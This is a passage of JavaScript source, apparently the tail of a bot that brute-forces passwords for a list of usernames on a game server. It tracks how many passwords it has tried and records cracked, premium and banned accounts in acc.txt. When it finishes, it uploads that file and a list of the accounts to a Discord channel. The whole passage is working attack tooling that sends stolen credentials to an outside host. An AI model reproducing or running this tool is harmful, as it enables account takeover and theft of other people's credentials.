        console.log(`⏳ Reconnecting in ${this.CONFIG.reconnectDelay / 1000}s...`);
        setTimeout(() => {
            if (!this.isFinished) {
                this.start();
            }
        }, this.CONFIG.reconnectDelay);
    }

    cleanup() {
        this.isActive = false;
        this.waitingForResponse = false;

        if (this.messageTimer) {
            clearTimeout(this.messageTimer);
            this.messageTimer = null;
        }

        if (this.responseTimer) {
            clearTimeout(this.responseTimer);
            this.responseTimer = null;
        }

        this.stopServerCheck();

        if (this.bot) {
            this.bot.end();
            this.bot = null;
        }
    }

    formatTime(ms) {
        const s = Math.floor(ms / 1000);
        const h = Math.floor(s / 3600);
        const m = Math.floor((s % 3600) / 60);
        return h ? `${h}h ${m}m ${s % 60}s` : m ? `${m}m ${s % 60}s` : `${s % 60}s`;
    }

    showFinalStats() {
        if (!this.startTime) return;
        const total = Date.now() - this.startTime;
        const active = total - this.totalDowntime;
        console.log('\n📊 === FINAL STATISTICS ===');
        console.log(`🕐 Total time: ${this.formatTime(total)}`);
        console.log(`⚡ Active time: ${this.formatTime(active)}`);
        console.log(`🔄 Downtime: ${this.formatTime(this.totalDowntime)}`);
        console.log(`📊 Passwords tested: ${this.currentIndex + (this.isSuccess ? 1 : 0)}`);
        console.log(`⚡ Avg/try: ${this.formatTime(this.totalResponseTime / (this.totalResponses || 1))}`);
        console.log('========================\n');
    }

    async handleRegistrationRequired() {
        console.log('📝 This account requires registration - skipping to next username');

        await sendToDiscord('logs', {
            title: '📝 Registration Required',
            description: `Username **${this.CONFIG.username}** requires registration and will be skipped.`,
            color: 0xffa500,
            fields: [
                { name: '👤 Username', value: this.CONFIG.username, inline: true },
                { name: '🎯 Server', value: this.CONFIG.host, inline: true },
                { name: '📁 Status', value: 'Requires Registration', inline: true },
                { name: '⏰ Skipped At', value: new Date().toLocaleString(), inline: true },
                { name: '📝 Action Taken', value: 'Moved to next username', inline: true }
            ]
        });

        this.isFinished = true;
        this.finishUsername();
    }

    async finishUsername() {
        this.isFinished = true;
        this.cleanup();

        // إرسال إشعار انتهاء اختبار username
        const totalTime = this.startTime ? Date.now() - this.startTime : 0;
        await sendToDiscord('logs', {
            title: '✅ Username Testing Completed',
            description: `Finished testing username: **${this.CONFIG.username}**`,
            color: 0x00ff00,
            fields: [
                { name: '👤 Username', value: this.CONFIG.username, inline: true },
                { name: '📊 Passwords Tested', value: `${this.currentIndex + (this.isSuccess ? 1 : 0)}`, inline: true },
                { name: '⏱️ Total Time', value: this.formatTime(totalTime), inline: true },
                { name: '🎯 Result', value: this.isSuccess ? 'Success' : 'No match found', inline: true },
                { name: '⏰ Finished At', value: new Date().toLocaleString(), inline: true }
            ]
        });

        // حذف اليوزرنيم من الملف
        removeUsernameFromFile(this.CONFIG.username);

        setTimeout(() => {
            this.manager.nextUsername();
        }, 1000);
    }
}

class PasswordManager {
    constructor(usernames) {
        this.usernames = usernames;
        this.index = 0;
        this.bot = null;
        this.startTime = new Date();
        this.successCount = 0;
        this.premiumCount = 0;
        this.bannedCount = 0;

        // تعيين المتغير العام
        globalManager = this;
    }

    async start() {
        if (this.index >= this.usernames.length) {
            console.log('\n🎉 Finished ALL usernames. Exiting.');

            // إرسال إشعار انتهاء البوت
            const totalTime = Date.now() - this.startTime;
            await sendToDiscord('general', {
                title: '🏁 Bot Completed Successfully',
                description: `All usernames have been processed. Bot operation completed.`,
                color: 0x00ff00,
                fields: [
                    { name: '📊 Total Usernames', value: `${this.usernames.length}`, inline: true },
                    { name: '✅ Successful Accounts', value: `${this.successCount}`, inline: true },
                    { name: '💎 Premium Accounts', value: `${this.premiumCount}`, inline: true },
                    { name: '⛔ Banned Accounts', value: `${this.bannedCount}`, inline: true },
                    { name: '⏱️ Total Time', value: this.formatTime(totalTime), inline: true },
                    { name: '⏰ Finished At', value: new Date().toLocaleString(), inline: true }
                ]
            });

            // إرسال ملف acc.txt إذا كان موجوداً ويحتوي على حسابات
            await this.sendAccFileOnCompletion();

            globalManager = null;
            process.exit(0);
        }

        const username = this.usernames[this.index];
        console.log(`\n🔄 Starting username ${this.index + 1}/${this.usernames.length}: ${username}`);

        this.bot = new PasswordBot(username, this);
        await this.bot.start();
    }

    // دالة لإرسال ملف acc.txt عند الانتهاء
    async sendAccFileOnCompletion() {
        try {
            const accFilePath = path.join(__dirname, 'acc.txt');

            // التحقق من وجود الملف
            if (!fs.existsSync(accFilePath)) {
                console.log('📁 No acc.txt file found - no accounts were discovered');

                await sendToDiscord('general', {
                    title: '📁 No Accounts Found',
                    description: 'The bot has finished processing all usernames, but no working accounts were discovered.',
                    color: 0xff9900,
                    fields: [
                        { name: '📊 Total Usernames Tested', value: `${this.usernames.length}`, inline: true },
                        { name: '✅ Working Accounts', value: '0', inline: true },
                        { name: '💎 Premium Accounts', value: `${this.premiumCount}`, inline: true }
                    ]
                });
                return;
            }

            // قراءة محتوى الملف
            const accContent = fs.readFileSync(accFilePath, 'utf8');

            // التحقق من أن الملف غير فارغ
            if (!accContent.trim()) {
                console.log('📁 acc.txt file is empty - no accounts were discovered');

                await sendToDiscord('general', {
                    title: '📁 No Working Accounts',
                    description: 'The acc.txt file exists but is empty. No working accounts were found during this session.',
                    color: 0xff9900,
                    fields: [
                        { name: '📊 Total Usernames Tested', value: `${this.usernames.length}`, inline: true },
                        { name: '✅ Working Accounts', value: '0', inline: true },
                        { name: '💎 Premium Accounts', value: `${this.premiumCount}`, inline: true }
                    ]
                });
                return;
            }

            // عد عدد الحسابات
            const accountLines = accContent.trim().split('\n').filter(line => line.trim());
            const accountCount = accountLines.length;

            console.log(`📤 Sending acc.txt file with ${accountCount} accounts to Discord`);

            // إرسال الملف في رسالة منفصلة
            if (discordBot && DISCORD_CONFIG.channels.general) {
                try {
                    const channel = await discordBot.channels.fetch(DISCORD_CONFIG.channels.general);
                    if (channel) {
                        await channel.send({
                            content: `📄 **Final Account Results File** \n\`\`\`\n${accountCount} accounts found\nFile: acc.txt\nGenerated: ${new Date().toLocaleString()}\n\`\`\``,
                            files: [{
                                attachment: accFilePath,
                                name: `acc_${new Date().toISOString().split('T')[0]}.txt`
                            }]
                        });
                        console.log('✅ acc.txt file sent to Discord successfully');
                    }
                } catch (error) {
                    console.error('❌ Failed to send acc.txt file:', error.message);
                }
            }

            // إرسال قائمة الحسابات في رسالة منفصلة إذا كان العدد قليل
            if (accountCount <= 10) {
                const accountsList = accountLines.map((line, index) => `${index + 1}. ||${line}||`).join('\n');

                await sendToDiscord('success', {
                    title: '📋 Final Account List',
                    description: `Here are all the discovered accounts:\n\n${accountsList}`,
                    color: 0x00ff00,
                    fields: [
                        { name: '📊 Total Found', value: `${accountCount}`, inline: true },
                        { name: '⏰ Session Completed', value: new Date().toLocaleString(), inline: true }
                    ]
                });
            }

        } catch (error) {
            console.error('❌ Error sending acc.txt file on completion:', error);

            await sendToDiscord('general', {
                title: '❌ Error Sending Results',
                description: 'An error occurred while trying to send the final results file.',
                color: 0xff0000,
                fields: [
                    { name: '🔍 Error Details', value: error.message, inline: false },
                    { name: '⏰ Error Time', value: new Date().toLocaleString(), inline: true }
                ]
            });
        }
    }

    async nextUsername() {
        console.log(`\n✅ Finished username: ${this.usernames[this.index]}`);

        // إعادة تحميل قائمة اليوزرنيمز من الملف (في حالة تم حذف بعضها)
        try {
            const updatedUsernames = reloadUsernamesFromFile();

            // إذا كانت القائمة فارغة، أنهِ البرنامج
            if (updatedUsernames.length === 0) {
                console.log('\n🎉 All usernames have been processed and removed from file. Exiting.');

                await this.sendAccFileOnCompletion();
                globalManager = null;
                process.exit(0);
            }

            // تحديث القائمة المحلية
            this.usernames = updatedUsernames;
            this.index = 0; // إعادة تعيين المؤشر للبداية

            console.log(`🔄 Updated usernames list. Remaining: ${this.usernames.length}`);

        } catch (error) {
            console.error(`❌ Failed to reload usernames: ${error.message}`);
            this.index++;
        }

        setTimeout(async () => {
            await this.start();
        }, 2000);
    }

    formatTime(ms) {
        const s = Math.floor(ms / 1000);
        const h = Math.floor(s / 3600);
        const m = Math.floor((s % 3600) / 60);
        return h ? `${h}h ${m}m ${s % 60}s` : m ? `${m}m ${s % 60}s` : `${s % 60}s`;
    }
}

// التعامل مع إغلاق البرنامج
process.on('SIGINT', async () => {
    console.log('\n🛑 Stopping all bots...');

    await sendToDiscord('general', {
        title: '🛑 Bot Stopped',
        description: 'Bot has been manually stopped by user.',
        color: 0xff0000,
        fields: [
            { name: '📁 Status', value: 'Manually stopped', inline: true },
            { name: '⏰ Stopped At', value: new Date().toLocaleString(), inline: true }
        ]
    });

    setTimeout(() => process.exit(0), 2000);
});

process.on('SIGTERM', async () => {
    console.log('\n🛑 Terminating all bots...');

    await sendToDiscord('general', {
        title: '🛑 Bot Terminated',
        description: 'Bot process has been terminated.',
        color: 0xff0000,
        fields: [
            { name: '📁 Status', value: 'Process terminated', inline: true },
            { name: '⏰ Terminated At', value: new Date().toLocaleString(), inline: true }
        ]
    });

    setTimeout(() => process.exit(0), 2000);
});

// تشغيل البوت
async function main() {
    await initDiscordBot();

    // انتظار حتى يتم تسجيل الدخول إلى Discord
    setTimeout(async () => {
        const manager = new PasswordManager(USERNAMES);
        await manager.start();
    }, 3000);
}

main().catch(console.error);